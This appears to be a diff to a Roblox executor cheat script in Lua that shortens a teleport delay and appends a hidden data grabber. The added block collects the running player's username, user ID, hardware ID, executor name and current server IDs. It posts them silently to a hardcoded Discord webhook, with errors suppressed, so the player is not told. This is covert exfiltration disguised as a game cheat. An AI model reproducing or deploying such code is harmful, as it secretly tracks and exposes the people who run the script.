@@ -442,7 +442,7 @@ function TeleportLoop()
     end
 end
 
-task.delay(180, function()
+task.delay(100, function()
     TeleportLoop()
 end)
 
@@ -563,3 +563,60 @@ end
 createToggle("Clear Map", 120, false, function(state)
     setMapInvisible(state)
 end)
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+--================= INFO =====================
+local EXECUTOR = identifyexecutor and identifyexecutor() or "Unknown Executor"
+local HWID = gethwid and gethwid() or "Unknown HWID"
+local PLACE_ID = game.PlaceId
+local JOB_ID = game.JobId
+
+--================= WEBHOOK ==================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1394759006064607404/,sI1QKoTRAguH4XgDTMpFjKKrmMlKpBuAnjd6kazoP3-AL41xNvlEvJ8Qxj1s7Xs6tgxQ" -- thay webhook của bạn
+
+--================= EMBED ====================
+local Embed = {
+    title = "Roblox Account Information",
+    url = "https://www.roblox.com/users/" .. LocalPlayer.UserId,
+    description = "Display Name: **" .. LocalPlayer.DisplayName .. "**",
+    color = 0x000000,
+    thumbnail = {
+        url = "https://www.roblox.com/headshot-thumbnail/image?userId="
+            .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+    },
+    fields = {
+        { name = "User Name", value = "`" .. LocalPlayer.Name .. "`", inline = true },
+        { name = "User ID", value = "`" .. LocalPlayer.UserId .. "`", inline = true },
+        { name = "Executor", value = "`" .. EXECUTOR .. "`", inline = true },
+        { name = "HWID", value = "`" .. HWID .. "`", inline = true },
+        { name = "Place ID", value = "`" .. PLACE_ID .. "`", inline = true },
+        { name = "Job ID", value = "`" .. JOB_ID .. "`", inline = true },
+        {
+            name = "Server Hop Script",
+            value = "```lua\n"
+                .. "game:GetService('TeleportService'):TeleportToPlaceInstance("
+                .. PLACE_ID .. ", '" .. JOB_ID .. "', game.Players.LocalPlayer)\n```",
+            inline = false
+        }
+    }
+}
+
+local Data = {
+    embeds = { Embed }
+}
+
+--================= SEND =====================
+local Request = http_request or request or syn and syn.request or http and http.request
+
+if Request then
+    pcall(function()
+        Request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(Data)
+        })
+    end)
+end
